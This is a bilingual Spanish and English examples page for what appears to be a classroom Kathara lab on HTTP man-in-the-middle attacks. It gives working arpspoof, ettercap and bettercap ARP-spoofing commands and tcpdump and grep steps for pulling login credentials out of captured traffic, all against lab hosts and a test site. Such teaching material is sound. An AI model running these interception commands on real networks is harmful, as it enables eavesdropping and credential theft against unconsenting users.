# Examples - p3 MITM HTTP

Navigation / Navegación: [Index](INDEX.md) | [Guide](README.md) | [Quickstart](QUICKSTART.md) | [Architecture](ARCHITECTURE.md) | [Network](NETWORK.md) | [Examples](EXAMPLES.md) | [Docker](DOCKER.md)

## Español

## 1. Flujo completo: VPN + VNC + Ataque MITM básico

```bash
cd kathara_migration_p3
./start-lab.sh
```

1. Importar `./shared/vpn/student1.conf` en WireGuard.
2. Activar túnel.
3. Abrir VNC a `192.168.0.2:5901`.
4. En víctima (VNC), abrir Firefox y navegar a `http://testphp.vulnweb.com/login.php`

### ARP Spoofing con arpspoof

En terminal del host:

```bash
# Envenenar tablas ARP (suplantar gateway)
kathara exec -d "$(pwd)" atacante "arpspoof -i eth0 -t 192.168.0.2 192.168.0.1"

# En otra terminal, capturar tráfico
kathara exec -d "$(pwd)" atacante "tcpdump -i eth0 -A -l | grep -i 'password\|user'"
```

### ARP Spoofing con ettercap

```bash
# Modo texto
kathara exec -d "$(pwd)" atacante "ettercap -T -q -M arp:remote /192.168.0.2// /192.168.0.1//"

# O capturar a archivo
kathara exec -d "$(pwd)" atacante "ettercap -T -q -M arp:remote /192.168.0.2// /192.168.0.1// -w /shared/mitm.ecp"
```

## 2. Captura con Wireshark/tshark

```bash
# Capturar todo el tráfico
kathara exec -d "$(pwd)" atacante "tcpdump -i eth0 -w /shared/capture.pcap"

# O usar tshark
kathara exec -d "$(pwd)" atacante "tshark -i eth0 -w /shared/capture.pcap"
```

Luego analizar en host:

```bash
wireshark ./shared/capture.pcap
```

## 3. Análisis de credenciales HTTP

Después de capturar tráfico con MITM activo:

```bash
# Extraer credenciales de formularios HTTP
kathara exec -d "$(pwd)" atacante "tcpdump -A -r /shared/capture.pcap | grep -E '(username|password|email|user|pass)'"

# O con strings
kathara exec -d "$(pwd)" atacante "strings /shared/capture.pcap | grep -E 'POST|GET' | head -20"
```

## 4. Prueba de salida a Internet

```bash
kathara exec -d "$(pwd)" victima "ping -c 2 1.1.1.1"
kathara exec -d "$(pwd)" atacante "ping -c 2 8.8.8.8"
```

Si falla, revisar `natgw`:

```bash
kathara exec -d "$(pwd)" natgw "ip route"
kathara exec -d "$(pwd)" natgw "iptables -t nat -S POSTROUTING"
```

## 5. Verificación automatizada

### Modo completo

```bash
./verify.sh --wait-for-handshake 30
```

### Modo CLI-only

```bash
./start-lab.sh --cli-only
./verify.sh
```

## 6. Diagnóstico de handshake WireGuard

Estado en servidor VPN:

```bash
kathara exec -d "$(pwd)" vpn "wg show"
```

Si no aparece `latest handshake`:

```bash
./start-lab.sh --force-proxy
```

Reimportar `student1.conf` y reconectar.

## 7. Flujo de parada segura

```bash
./stop-lab.sh
```

Luego validar que no quedan nodos:

```bash
kathara linfo -d "$(pwd)"
```

## 8. Uso de carpeta compartida

Host:

```bash
cp ./docs/QUICKSTART.md ./shared/
```

Dentro de nodos:

```bash
kathara exec -d "$(pwd)" victima "ls -la /shared"
kathara exec -d "$(pwd)" atacante "ls -la /shared"
```

## 9. Ejemplo completo: Captura de login HTTP

```bash
# 1. Iniciar laboratorio
./start-lab.sh

# 2. Esperar y verificar
sleep 5
./verify.sh

# 3. Conectar WireGuard e iniciar VNC a 192.168.0.2:5901

# 4. En víctima (VNC): Abrir Firefox, ir a http://testphp.vulnweb.com/login.php

# 5. En atacante (nueva terminal):
kathara exec -d "$(pwd)" atacante "arpspoof -i eth0 -t 192.168.0.2 192.168.0.1" &
kathara exec -d "$(pwd)" atacante "tcpdump -i eth0 -w /shared/login_capture.pcap"

# 6. En víctima: Introducir credenciales dummy (test/test)

# 7. Detener tcpdump (Ctrl+C) y analizar:
kathara exec -d "$(pwd)" atacante "tcpdump -A -r /shared/login_capture.pcap | grep -A5 -B5 'password'"
```

## 10. Ataque MITM con Bettercap (UI Web)

Bettercap es una herramienta moderna y potente para ataques MITM con interfaz web.

### Usar Bettercap UI

```bash
# Iniciar bettercap con UI web en background
kathara exec -d "$(pwd)" atacante "bettercap -iface eth0 -caplet http-ui" &
```

Acceder desde navegador (a través de VPN):
- URL: http://192.168.0.3
- Usuario: admin (configurable)
- Password: admin (configurable)

### Usar Bettercap CLI

```bash
# Iniciar en modo interactivo
kathara exec -d "$(pwd)" atacante "bettercap -iface eth0"

# Comandos útiles:
>> set arp.spoof.targets 192.168.0.2
>> set arp.spoof.gateway 192.168.0.1
>> arp.spoof on
>> net.sniff on
>> http.proxy on
```

### Bettercap caplet (script automatizado)

Crear `/shared/mitm.cap`:
```
set arp.spoof.targets 192.168.0.2
set arp.spoof.gateway 192.168.0.1
arp.spoof on
net.sniff on
```

Ejecutar:
```bash
kathara exec -d "$(pwd)" atacante "bettercap -iface eth0 -caplet /shared/mitm.cap"
```

---

## English

## 1. Full flow: VPN + VNC + Basic MITM attack

```bash
cd kathara_migration_p3
./start-lab.sh
```

1. Import `./shared/vpn/student1.conf` into WireGuard.
2. Activate tunnel.
3. Open VNC to `192.168.0.2:5901`.
4. In victim (VNC), open Firefox and browse to `http://testphp.vulnweb.com/login.php`

### ARP Spoofing with arpspoof

In host terminal:

```bash
# Poison ARP tables (impersonate gateway)
kathara exec -d "$(pwd)" atacante "arpspoof -i eth0 -t 192.168.0.2 192.168.0.1"

# In another terminal, capture traffic
kathara exec -d "$(pwd)" atacante "tcpdump -i eth0 -A -l | grep -i 'password\|user'"
```

### ARP Spoofing with ettercap

```bash
# Text mode
kathara exec -d "$(pwd)" atacante "ettercap -T -q -M arp:remote /192.168.0.2// /192.168.0.1//"

# Or capture to file
kathara exec -d "$(pwd)" atacante "ettercap -T -q -M arp:remote /192.168.0.2// /192.168.0.1// -w /shared/mitm.ecp"
```

## 2. Capture with Wireshark/tshark

```bash
# Capture all traffic
kathara exec -d "$(pwd)" atacante "tcpdump -i eth0 -w /shared/capture.pcap"

# Or use tshark
kathara exec -d "$(pwd)" atacante "tshark -i eth0 -w /shared/capture.pcap"
```

Then analyze on host:

```bash
wireshark ./shared/capture.pcap
```

## 3. HTTP credentials analysis

After capturing traffic with active MITM:

```bash
# Extract form credentials from HTTP
kathara exec -d "$(pwd)" atacante "tcpdump -A -r /shared/capture.pcap | grep -E '(username|password|email|user|pass)'"

# Or with strings
kathara exec -d "$(pwd)" atacante "strings /shared/capture.pcap | grep -E 'POST|GET' | head -20"
```

## 4. Internet egress test

```bash
kathara exec -d "$(pwd)" victima "ping -c 2 1.1.1.1"
kathara exec -d "$(pwd)" atacante "ping -c 2 8.8.8.8"
```

If it fails, inspect `natgw`:

```bash
kathara exec -d "$(pwd)" natgw "ip route"
kathara exec -d "$(pwd)" natgw "iptables -t nat -S POSTROUTING"
```

## 5. Automated verification

### Full mode

```bash
./verify.sh --wait-for-handshake 30
```

### CLI-only mode

```bash
./start-lab.sh --cli-only
./verify.sh
```

## 6. WireGuard handshake diagnostics

VPN server status:

```bash
kathara exec -d "$(pwd)" vpn "wg show"
```

If `latest handshake` is missing:

```bash
./start-lab.sh --force-proxy
```

Re-import `student1.conf` and reconnect.

## 7. Safe shutdown flow

```bash
./stop-lab.sh
```

Then verify no running nodes:

```bash
kathara linfo -d "$(pwd)"
```

## 8. Shared folder usage

Host:

```bash
cp ./docs/QUICKSTART.md ./shared/
```

Inside nodes:

```bash
kathara exec -d "$(pwd)" victima "ls -la /shared"
kathara exec -d "$(pwd)" atacante "ls -la /shared"
```

## 9. Complete example: HTTP login capture

```bash
# 1. Start lab
./start-lab.sh

# 2. Wait and verify
sleep 5
./verify.sh

# 3. Connect WireGuard and start VNC to 192.168.0.2:5901

# 4. In victim (VNC): Open Firefox, go to http://testphp.vulnweb.com/login.php

# 5. In attacker (new terminal):
kathara exec -d "$(pwd)" atacante "arpspoof -i eth0 -t 192.168.0.2 192.168.0.1" &
kathara exec -d "$(pwd)" atacante "tcpdump -i eth0 -w /shared/login_capture.pcap"

# 6. In victim: Enter dummy credentials (test/test)

# 7. Stop tcpdump (Ctrl+C) and analyze:
kathara exec -d "$(pwd)" atacante "tcpdump -A -r /shared/login_capture.pcap | grep -A5 -B5 'password'"
```

## 10. MITM Attack with Bettercap (Web UI)

Bettercap is a modern and powerful tool for MITM attacks with a web interface.

### Using Bettercap UI

```bash
# Start bettercap with web UI in background
kathara exec -d "$(pwd)" atacante "bettercap -iface eth0 -caplet http-ui" &
```

Access from browser (via VPN):
- URL: http://192.168.0.3
- User: admin (configurable)
- Password: admin (configurable)

### Using Bettercap CLI

```bash
# Start in interactive mode
kathara exec -d "$(pwd)" atacante "bettercap -iface eth0"

# Useful commands:
>> set arp.spoof.targets 192.168.0.2
>> set arp.spoof.gateway 192.168.0.1
>> arp.spoof on
>> net.sniff on
>> http.proxy on
```

### Bettercap caplet (automation script)

Create `/shared/mitm.cap`:
```
set arp.spoof.targets 192.168.0.2
set arp.spoof.gateway 192.168.0.1
arp.spoof on
net.sniff on
```

Run:
```bash
kathara exec -d "$(pwd)" atacante "bettercap -iface eth0 -caplet /shared/mitm.cap"
```
